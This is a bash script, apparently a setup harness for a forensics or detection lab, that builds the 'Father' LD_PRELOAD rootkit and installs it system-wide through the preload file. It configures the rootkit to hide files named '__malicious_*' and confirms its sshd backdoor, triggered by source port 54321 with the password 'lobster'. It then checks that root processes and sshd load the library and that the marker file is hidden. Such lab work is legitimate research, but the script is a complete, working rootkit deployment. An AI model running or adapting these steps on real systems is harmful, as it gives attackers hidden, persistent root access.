#!/usr/bin/env bash
set -Eeuo pipefail
trap 'trap - ERR; printf "Father scenario failed at line %s\n" "$LINENO" >&2' ERR

if [[ "$#" -ne 4 ]]; then
    echo "usage: $0 ROOT INSTALLED_LIBRARY PRELOAD_CONFIG DURATION" >&2
    exit 2
fi

root=$1
installed_library=$2
preload_config=$3
process_duration=$4

source_dir="$root/source"
father_source_tree="$source_dir/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"
father_archive="$source_dir/father-upstream-4eb2712.tar"
father_config="$father_source_tree/src/config.h"
father_library="$father_source_tree/rk.so"
recovery_dir="$root/recovery"
preload_backup="$recovery_dir/ld.so.preload.before"
preload_absent_marker="$recovery_dir/ld.so.preload.was_absent"
probe_dir="$root/probe"
marker="$probe_dir/__malicious_file"
before_output="$probe_dir/before.txt"
after_output="$probe_dir/after.txt"

# The baseline carries every build/runtime prerequisite; the run stays offline.
for required in gcc make systemctl; do
    command -v "$required" >/dev/null 2>&1
done
test -x /usr/bin/python3
test -x /usr/bin/setsid
test -x /usr/bin/sleep
test -x /bin/ls
test -f /usr/include/security/pam_appl.h
test -f /usr/include/gcrypt.h
ldconfig -p | grep 'libgcrypt\.so' >/dev/null

# Extract and configure only this run's pinned Father source.
rm -rf "$father_source_tree"
mkdir -p "$source_dir" "$probe_dir"
tar -xf "$father_archive" -C "$source_dir"
test -f "$father_config"
sed -i \
    -e 's|^#define STRING .*|#define STRING "__malicious_"|' \
    -e 's|^#define PRELOAD .*|#define PRELOAD "father_calibration_nohide"|' \
    -e "s|^#define INSTALL_LOCATION .*|#define INSTALL_LOCATION \"$installed_library\"|" \
    "$father_config"
grep -Fqx '#define GID 1337' "$father_config"
grep -Fqx '#define SOURCEPORT 54321' "$father_config"
grep -Fqx '#define SHELL_PASS "lobster"' "$father_config"
grep -Fqx '#define STRING "__malicious_"' "$father_config"
grep -Fqx '#define PRELOAD "father_calibration_nohide"' "$father_config"
grep -Fqx "#define INSTALL_LOCATION \"$installed_library\"" "$father_config"
sha256sum "$father_config"

(
    cd "$father_source_tree"
    make clean >/dev/null 2>&1 || true
    make father
)
test -f "$father_library"
sha256sum "$father_library"

# Capture the marker while it is still visible to an ordinary process.
touch "$marker"
ls -1 -- "$probe_dir" > "$before_output"
grep -Fqx '__malicious_file' "$before_output"

# Snapshot restoration is cleanup; retain only a recovery/evidence copy here.
sudo -n install -d -m 0755 "$(dirname "$installed_library")"
sudo -n install -m 0644 "$father_library" "$installed_library"
sudo -n env LD_PRELOAD="$installed_library" /usr/bin/python3 -c \
    'from pathlib import Path; import sys; assert sys.argv[1] in Path("/proc/self/maps").read_text()' \
    "$installed_library"
sudo -n install -d -m 0700 "$recovery_dir"
if sudo -n test -e "$preload_config"; then
    sudo -n cp --preserve=all -- "$preload_config" "$preload_backup"
    sudo -n rm -f -- "$preload_absent_marker"
else
    sudo -n rm -f -- "$preload_backup"
    printf 'preload file was absent\n' | sudo -n tee "$preload_absent_marker" >/dev/null
    sudo -n chmod 0600 "$preload_absent_marker"
fi
printf '%s\n' "$installed_library" | sudo -n tee "$preload_config" >/dev/null
sudo -n chmod 0644 "$preload_config"

# These detached root processes prove system-wide loading and remain for RAM.
pids=()
for _ in 1 2 3; do
    pid="$(
        sudo -n /bin/sh -c \
            '/usr/bin/setsid /usr/bin/sleep "$1" </dev/null >/dev/null 2>&1 & echo $!' \
            sh "$process_duration"
    )"
    [[ "$pid" =~ ^[1-9][0-9]*$ ]]
    pids+=("$pid")
done
sleep 1
for pid in "${pids[@]}"; do
    sudo -n kill -0 "$pid"
    sudo -n grep -Fq "$installed_library" "/proc/$pid/maps"
done

# Father hooks accept(), not a port. Restart the real root listener after
# activation, then the host connects to sshd:22 from source port 54321.
sudo -n systemctl restart ssh.service
sshd_pid="$(sudo -n systemctl show --property=MainPID --value ssh.service)"
[[ "$sshd_pid" =~ ^[1-9][0-9]*$ ]]
sudo -n grep -Fq "$installed_library" "/proc/$sshd_pid/maps"

# The new ls exercises Father's STRING-based readdir() hook. No completion
# token is involved; the Bash process doing the final checks predates activation.
ls -1 -- "$probe_dir" > "$after_output"
after_listing="$(< "$after_output")"
[[ "$after_listing" != *"__malicious_file"* ]]
[[ "$after_listing" == *"before.txt"* ]]
[[ -e "$marker" ]]

printf 'FATHER_RESULT pids=%s,%s,%s sshd_pid=%s\n' \
    "${pids[0]}" "${pids[1]}" "${pids[2]}" "$sshd_pid"
